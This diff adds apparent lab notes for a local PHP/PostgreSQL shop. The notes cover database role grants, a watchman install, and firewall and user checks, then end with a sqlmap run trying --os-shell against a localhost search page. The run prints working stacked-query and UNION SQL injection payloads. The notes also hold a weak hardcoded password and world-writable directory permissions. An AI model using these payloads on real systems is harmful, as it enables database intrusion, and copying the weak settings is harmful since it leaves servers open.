@@ -1,0 +1,110 @@
+[postgres@localhost ~]$ psql
+psql (12.4)
+Type "help" for help.
+
+postgres=# create user web with password 'w3b';
+CREATE ROLE
+
+[postgres@localhost ~]$ psql purchasedb
+psql (12.4)
+Type "help" for help.
+
+purchasedb=# grant select, update, insert, delete on table purchases to web;
+GRANT
+
+[postgres@localhost ~]$ psql productdb
+psql (12.4)
+Type "help" for help.
+
+productdb=# grant select, update, insert, delete on table products to web;
+GRANT
+productdb=# grant select, update on table products_id_seq to web;
+GRANT
+
+postgres@localhost ~]$ psql userdb
+psql (12.4)
+Type "help" for help.
+
+userdb=# \dt
+         List of relations
+ Schema | Name  | Type  |  Owner
+--------+-------+-------+----------
+ public | users | table | postgres
+(1 row)
+
+userdb=# grant select, update, insert, delete on table users to web;
+GRANT
+
+chmod 755 images/
+
+
+postgres=# SET log_statement = 'all';
+
+[root@localhost ~]# unzip watchman-v2021.03.01.00-linux.zip
+[root@localhost ~]# mv watchman-v2021.03.01.00-linux/bin/watchman /usr/local/bin
+[root@localhost ~]# mkdir -p /usr/local/var/run/watchman
+[root@localhost ~]# mv watchman-v2021.03.01.00-linux/lib/* /usr/local/lib
+[root@localhost ~]# chmod 2777 /usr/local/var/run/watchman
+
+watchman watch /var/projects/ecommerce
+watchman shutdown-server
+
+root@localhost system]# iptables -L OUTPUT
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination
+ACCEPT     udp  --  anywhere             anywhere             udp dpt:bootpc
+
+Apache User:
+root@localhost httpd]# grep apache /etc/passwd
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+has no login shell
+
+~: sqlmap -u "http://localhost:8088/products/search.php?product=foo" --os-shell
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.5#stable}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:13:18 /2021-03-07/
+
+[23:13:18] [INFO] resuming back-end DBMS 'postgresql' 
+[23:13:18] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=72okcpn3l0b...6lgtc234h9'). Do you want to use those [Y/n] 
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: product (GET)
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: product=';SELECT PG_SLEEP(5)--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: product=' UNION ALL SELECT (CHR(113)||CHR(118)||CHR(112)||CHR(112)||CHR(113))||(CHR(98)||CHR(88)||CHR(73)||CHR(80)||CHR(87)||CHR(100)||CHR(117)||CHR(89)||CHR(84)||CHR(111)||CHR(67)||CHR(88)||CHR(114)||CHR(76)||CHR(86)||CHR(108)||CHR(99)||CHR(73)||CHR(99)||CHR(100)||CHR(120)||CHR(83)||CHR(77)||CHR(116)||CHR(105)||CHR(77)||CHR(98)||CHR(67)||CHR(99)||CHR(75)||CHR(83)||CHR(105)||CHR(103)||CHR(65)||CHR(83)||CHR(121)||CHR(79)||CHR(109)||CHR(78)||CHR(68))||(CHR(113)||CHR(106)||CHR(98)||CHR(122)||CHR(113)),NULL-- nQbF
+---
+[23:13:19] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux CentOS 8
+web application technology: PHP 7.2.24, Apache 2.4.37, PHP
+back-end DBMS: PostgreSQL
+[23:13:19] [INFO] fingerprinting the back-end DBMS operating system
+[23:13:19] [INFO] the back-end DBMS operating system is Linux
+[23:13:19] [INFO] testing if current user is DBA
+[23:13:19] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+[23:13:19] [WARNING] the SQL query provided does not return any output
+[23:13:19] [WARNING] time-based comparison requires larger statistical model, please wait.......................... (done)               
+[23:13:20] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+
+[23:13:20] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[23:13:20] [INFO] detecting back-end DBMS version from its banner
+what is the back-end database management system architecture?
+[1] 32-bit (default)
+[2] 64-bit
+> 2
+[23:13:21] [CRITICAL] unsupported feature on PostgreSQL 12 (64-bit)
+
+[*] ending @ 23:13:21 /2021-03-07/
+
+
